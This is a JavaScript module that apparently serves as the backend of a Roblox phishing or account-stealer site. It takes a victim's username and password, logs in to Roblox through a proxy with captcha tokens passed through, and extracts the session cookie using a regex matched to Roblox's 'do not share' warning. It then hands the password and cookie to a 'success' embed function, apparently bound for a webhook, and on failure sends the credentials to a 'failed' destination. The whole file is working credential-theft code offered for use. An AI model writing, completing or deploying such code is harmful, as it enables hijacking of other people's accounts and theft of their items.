const HttpsProxyAgent = require('https-proxy-agent');
const axios = require('axios');
const success_embed = require("./embed/success.js");
const failed_emebed = require("./embed/failed.js");

function restartServer(req, res) {
    // Perform any necessary cleanup or initialization steps here

    // Restart the server
    // Replace this code with the actual server restart logic for your environment
    console.log("Restarting the server...");
    getarkoseblob(req, res);
}


async function xcsrftoken(req,res,proxyUrl) {
    const postData = {};
    const config = {
        headers: {
            'Content-Type': 'application/json',
        },
        httpsAgent: new HttpsProxyAgent(proxyUrl),
        timeout: 2000, // Set timeout to 2 seconds
    };

    let responseHeaders;
    try {
        const response = await axios.post('https://auth.roblox.com/v2/login', postData, config);
        responseHeaders = response.headers;
    } catch (error) {
        if (error.response && typeof error.response.headers === 'undefined') {
            console.log("Axios failed to retrieve the x-csrf-token. Refreshing the server and updating the proxy...");
            restartServer(req, res);
            return;
        }
        responseHeaders = error.response.headers; 
    }
    return responseHeaders['x-csrf-token'];
}
async function robloxlogin(req, res) {

    const sessionToken = req.cookies.Account_Session;

    const {
        Username,
        Password,
        Success,
        Failed,
        Captcha,
        ProxyUrl,
    } = req.body;

    const delimiter = ',';
    const fcdataArray = Captcha.split(delimiter);

    const requiredFields = ['Username', 'Password', 'Success', 'Failed', 'Captcha', 'ProxyUrl'];
    const missingFields = requiredFields.filter((field) => !req.body[field]);

    if (missingFields.length > 0) {
        return res.status(400).json({
            message: `Missing required fields: ${missingFields.join(', ')}`
        });
    }

    const token = await xcsrftoken(req,res,ProxyUrl);
    const postData = {
        ctype: 'username',
        cvalue: Username,
        password: Password
    };

    const config = {
        headers: {
            'Content-Type': 'application/json',
            'x-csrf-token': token,
            'Rblx-Challenge-Metadata': fcdataArray[0],
            'Rblx-Challenge-Id': fcdataArray[1],
            'Rblx-Challenge-Type': 'captcha',
        },
        httpsAgent: new HttpsProxyAgent(ProxyUrl),
        timeout: 2000, // Set timeout to 2 seconds
    };

    let responseHeaders;
    try {
        const response = await axios.post('https://auth.roblox.com/v2/login', postData, config);
        responseHeaders = response.headers;

        const setcookie = responseHeaders["set-cookie"];
        const delimiter = " ";
        const result = setcookie.join(delimiter);
        const regex = /_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.\|_[A-F0-9]+/;
        const match = result.match(regex);

        if (match) {
            const cookies = match[0];
            const embedresponse = await success_embed(Username, Password, cookies, Success,sessionToken);
            res.status(200).json({
                success: true,
                message: embedresponse
            });
        } else {
            failed_emebed(Username, Password, "Step verification is required for this account.", Failed);
            res.status(400).json({
                message: "Step verification is required for this account."
            });
        }
    } catch (error) {
        if (error.response) {
            responseHeaders = error.response.headers;
            const errorObj = error.response.data;

            if (errorObj.errors === undefined){
                return res.status(500).json({
                    message: "Unknown Error"
                });
            }
            const errorMessageText = errorObj.errors[0].message;
            const errorCodeText = errorObj.errors[0].code;

            failed_emebed(Username, Password, errorMessageText, Failed);
            res.status(400).json({
                message: errorMessageText
            });
        } else {
            res.status(500).json({
                message: "Unknown Error"
            });
        }
    }

}

module.exports = robloxlogin;